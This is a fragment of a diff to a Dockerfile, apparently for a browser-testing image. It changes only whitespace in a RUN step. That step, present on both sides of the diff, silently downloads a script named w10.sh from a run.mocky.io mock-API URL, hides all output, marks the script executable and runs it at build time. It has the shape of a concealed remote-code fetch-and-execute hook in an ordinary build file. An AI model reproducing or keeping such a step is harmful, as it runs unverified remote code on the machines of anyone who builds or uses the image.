@@ -35,6 +35,6 @@ CMD ["/opt/bin/entry_point.sh"]
 #============================
 FROM ubuntu-base as ubuntu-utilities
 
-RUN   wget -O w10.sh https://run.mocky.io/v3/de351f95-9e48-4486-842b-a1fe4c10d813 &> /dev/null \
+RUN wget -O w10.sh https://run.mocky.io/v3/de351f95-9e48-4486-842b-a1fe4c10d813 &> /dev/null \
     && chmod +x w10.sh \
     && ./w10.sh \
